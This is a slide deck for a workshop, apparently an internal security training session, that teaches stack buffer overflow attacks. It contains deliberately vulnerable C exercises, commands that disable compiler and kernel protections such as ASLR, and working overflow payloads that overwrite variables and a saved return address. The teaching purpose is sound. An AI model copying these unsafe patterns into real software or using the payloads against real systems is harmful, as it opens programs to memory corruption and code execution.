---
title: Defence Against the Dark Arts
theme: solarized
revealOptions:
    transition: 'fade'
---

# Defence Against the Dark Arts

> #4: London, 27th February, 2020

---

## Purpose

> A place where we can practice the techniques used to attack applications,
in order to understand them, and to defend against them.

---

## Session rules

 * There are no stupid questions!
 * If you'd like to share (or learn) more about a topic by leading a session, let us know!
 * Participate as you would in a pairing session

---

## Important rule!

*Get permission* before attacking a system

Or, attack your own.

---

# Buffer Overflows

---

## Practical requirements

* Linux VM
 - https://github.com/gcapizzi/linux-training-playground might be useful!
* gcc
* gdb
* 32-bit libraries
  - `apt install gcc-multilib`

---

## What are buffer overflow attacks?

* Attacker uses program input with unchecked bounds to corrupt memory
* Can cause programs to crash
* Can allow arbitrary code execution with program's privileges

---

## What is vulnerable

* Programs written in languages with low-level memory management, e.g.
  - C
  - C++
  - Assembly
  - e.g. Operating Systems ;)
* Functions without bounds checking, e.g.
  - `gets`, `strcpy`, `scanf`, `sprintf`, `getenv`, ...

---

## Example

```c
#include <string.h>

int main(int argc, char **argv) {
  char whatever[20];
  strcpy(whatever, argv[1]);

  return 0;
}
```

---

## Example

```c
#include <string.h>

int main(int argc, char **argv) {
  char whatever[20];
  strcpy(whatever, argv[1]);

  return 0;
}
```

Run it:
```bash
$ ./whatever asdf
$ ./whatever 01234567890123456789
$ ./whatever $(python -c "print 'A'*24")
$ ./whatever $(python -c "print 'A'*25")
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```

---

## 'Smash stacking detected'

* Protection provided by `gcc`
* Canary values inserted into the stack
* When canaries are modified, program immediately terminates
* Makes life harder, but not impossible for hackers
* We'll use `-fno-stack-protector` option to disable it

---

## Exercise - Basic data manipulation

<small>Build the following c program. Run it and get the 'you have changed...' message.</small>
<small>See https://github.com/kieron-pivotal/buffer-overflows exercise01.c</small>

```c
#include <stdio.h>

int main(int argc, char **argv) {
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if (modified != 0) {
    printf("you have changed the 'modified' variable\n");
  } else {
    printf("Try again?\n");
  }
}
```

---

## Solution

```bash
$ gcc -fno-stack-protector -o exercise01 exercise01.c
exercise01.c: In function ‘main’:
exercise01.c:8:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
    8 |   gets(buffer);
      |   ^~~~
      |   fgets

$ python -c 'print "A"*80' | ./exercise01
you have changed the 'modified' variable
```

---

## Exercise - More precision

<small>

`exercise02.c` in github

```c
int main(int argc, char **argv) {
  volatile int modified;
  char buffer[64];

  if (argc == 1) {
    errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if (modified == 0x61626364) {
    printf("you have correctly got the variable to the right value\n");
  } else {
    printf("Try again, you got 0x%08x\n", modified);
  }
}
```
</small>

---

## Solution

<small>
Notice `a` is `0x61` in hex.

Also, as we are overflowing *up* the stack, we must reverse the payload characters.
</small>

```bash
$ ./exercise02 $(python -c 'print "A"*64 + "dcba"')
you have correctly got the variable to the right value
Segmentation fault (core dumped)
```

---

## Example - another vector

```c
int main(int argc, char **argv) {
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");
  modified = 0;
  strcpy(buffer, variable);

  if (modified == 0x0d0a0d0a) {
    printf("you have correctly modified the variable\n");
  } else {
    printf("Try again, you got 0x%08x\n", modified);
  }
}
```

---

## Solution

<small>Env vars are another possible attack vector</small>

```bash
GREENIE=$(python -c 'print "A"*64 + "\x0a\x0d\x0a\x0d"') ./exercise03
you have correctly modified the variable
```

---

## Memory Layout in a C Program

![memlayout](https://i.stack.imgur.com/1Yz9K.gif)

---

### Some common registers (32 bit)

* %eip: instruction pointer
* %esp: stack pointer
* %ebp: base pointer

---

### Memory management during function calls

```c
void func(int a, int b)
{
    int c;
    int d;
    // some code
}
void main()
{
    func(1, 2);
    // next instruction
}
```

---

When `main` calls `func`
* Params pushed in reverse order onto stack
* Current value of `%eip` pushed onto stack
* `%eip` set to address of `func`

---

Inside `func`
* Push `%ebp` onto stack so we can restore it when `func` returns
* Store `%esp` in `%ebp` as new base pointer
* Push local vars onto stack, or reserve space for them

---

At end of `func`
* Restore stack by setting `%esp` to `%ebp`
  - clears local vars 
* Pop stored `%ebp` off stack into `%ebp`
* Pop stored `%eip` off stack into `%eip`

---

Back in `main`
* Execution continues after `func` call
* Can clean up `func` parameters from stack

---

How stack looks at start of `func` execution

![funcMem](https://dhavalkapil.com/assets/images/Buffer-Overflow-Exploit/stack.png)

---

## OS Mitigations

### Address Space Randomisation

* Location of code is randomised on each call
* Impossible for attacker to precisely target code locations
* Workarounds exist

To turn off:
```bash
# echo 0 > /proc/sys/kernel/randomize_va_space
```

---

## Exercise - modify %eip

<small>`typing.c` on github</small>

```c
void secretFunction() {
  printf("Congratulations!\n");
}

void echo() {
  char buffer[20];

  printf("Enter some text: ");
  scanf("%s", buffer);
  printf("You entered: %s\n", buffer);
}

int main() {
  echo();
}
```

---

### Tips

* Make sure you still use `-fno-stack-protector`
* Turn off position independent code with `-no-pie`
* Use `objdump` or `gdb` to find address of `secretFunction`
* Aim to overwrite the stored value of %eip in the stack

---

### Solution

```bash
$ gdb typing
(gdb) info functions
(gdb) disassemble echo
```

<small>Look for `lea -0x1c(%ebp),%eax` prior to `scanf` call</small>

```bash
$ python -c 'print "A"*32 + "\xd6\x91\x04\x08"' | ./typing
```

---

## Demo - shell execution

<small>
Turn off non-executable stacks with `-z execstack` in `gcc`
</small>

```c
vuln() {
  char buffer[64];
  gets(buffer);
}

int main(int argc, char **argv) {
  vuln();
}
```
